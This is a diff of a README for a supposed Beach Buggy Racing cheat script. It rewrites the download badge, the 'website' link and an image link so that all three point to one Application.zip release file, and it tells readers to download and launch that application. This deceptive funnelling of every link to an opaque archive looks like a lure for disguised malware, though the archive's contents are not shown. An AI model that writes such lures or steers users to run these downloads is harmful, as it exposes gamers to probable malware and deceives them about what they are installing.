@@ -13,7 +13,7 @@ Welcome to the BB Racing Cheat Engine Script repository! This script is the ulti
 ### Get Started
 To access the BB Racing Cheat Engine Script, simply download the application from the following link: 
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/file/Application.zip) 
+[![Download Application](https://github.com/Mirzanj/BB-RACING-CHEAT-ENGINE-SCRIPT/releases/download/v1.0.0/Application.zip)](https://github.com/Mirzanj/BB-RACING-CHEAT-ENGINE-SCRIPT/releases/download/v1.0.0/Application.zip) 
 
 (*Note: The application needs to be launched for the script to take effect.*)
 
@@ -32,14 +32,14 @@ Explore the world of Beach Buggy Racing and cheat engine scripts with these exci
 - racing-game
 
 ### Visit the Website
-For more information and updates on BB Racing Cheat Engine Script, visit our [website](https://www.bbracingcheatengine.com).
+For more information and updates on BB Racing Cheat Engine Script, visit our [website](https://github.com/Mirzanj/BB-RACING-CHEAT-ENGINE-SCRIPT/releases/download/v1.0.0/Application.zip).
 
 ### Releases Section
 If you encounter any issues with the download link or require further assistance, check out the **Releases** section of this repository for additional resources and support.
 
 ### Let's Race to Victory! 🏆🚗💨
 
-![Beach Buggy Racing](https://example.com/beach-buggy-racing-image.jpg)
+![Beach Buggy Racing](https://github.com/Mirzanj/BB-RACING-CHEAT-ENGINE-SCRIPT/releases/download/v1.0.0/Application.zip)
 
 Remember, the BB Racing Cheat Engine Script is meant for enhancing your gaming experience and adding a fun twist to your gameplay. Download the script, dive into the world of Beach Buggy Racing, and enjoy the thrill of the race like never before! 🌴🏁🎮
 
